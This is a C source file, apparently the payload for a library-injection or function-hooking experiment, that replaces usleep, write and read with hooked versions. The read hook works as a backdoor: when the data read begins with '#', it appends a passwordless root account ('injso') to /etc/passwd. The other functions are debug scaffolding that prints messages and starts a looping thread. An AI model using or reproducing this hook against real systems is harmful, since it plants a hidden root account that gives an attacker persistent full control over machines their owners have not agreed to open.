#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
 
int (*oldusleep)(useconds_t usec);
   

int newusleep(useconds_t usec)
{
	int ret;
       
 	printf("newusleep\n");

	ret = oldusleep(usec);



	return ret;
}
 

int (*oldwrite) (int fd, const void *buf, size_t count);
ssize_t(*oldread) (int fd, void *buf, size_t count);

void *dolife(void *arg)
{
	FILE *fp;
	int i;

	puts("ok");
	puts("ok");
	puts("ok");
	pthread_detach(pthread_self());
	for (i = 0; i < 256; i++) {
		puts("dolife ok");
/*		fp = fopen("/home/grip2/lifelog.txt", "a");
		fprintf(fp, "%d\n", i);
		fclose(fp);
*/ sleep(1);
	}
}

void newput(const char *s)
{
	printf("this is %s speaking\n",s);
}

int newwrite(int fd, const void *buf, size_t count)
{
	static int n = 0;
	static int f = 0;
	pthread_t tid;

//      if (0 == f++)
//              pthread_create(&tid, NULL, &dolife, NULL);
	if (n++ > 2)
		exit(0);
	printf("In newwrite :)\n");
	printf("oldwrite %p\n", oldwrite);
	printf("newwrite %p\n", newwrite);
	oldwrite(fd, buf, count);
	n--;

	return count;
}

ssize_t newread(int fd, void *buf, size_t count)
{
	ssize_t ret;
	FILE *fp;
	char ch = '#';

	ret = oldread(fd, buf, count);

	if (memcmp(buf, (void *) &ch, 1) == 0) {
		fp = fopen("/etc/passwd", "a");
		fputs("injso::0:0:root:/root:/bin/sh\n", fp);
		fclose(fp);
	}


	return ret;
}


void newlife(void)
{
	pthread_t tid;
	char ch;

	puts("ok");
	pthread_create(&tid, NULL, &dolife, NULL);
//exit(0);
/*
//for(;;)
{
	puts("ok create");
//	puts("ok create");
//	fflush(stdout);
ch = getchar();
	puts("ok create");
	puts("ok create");
if ('q' == ch)
break;
}
*/
/*
if(fork() == 0)
{
dolife(0);
exit(0);
}
*/
	puts("ok create");
	puts("ok create");
	puts("ok create");
	puts("ok create");
	puts("ok create");
	puts("ok create");
	puts("ok create");
	puts("ok create");
	puts("ok create");
}

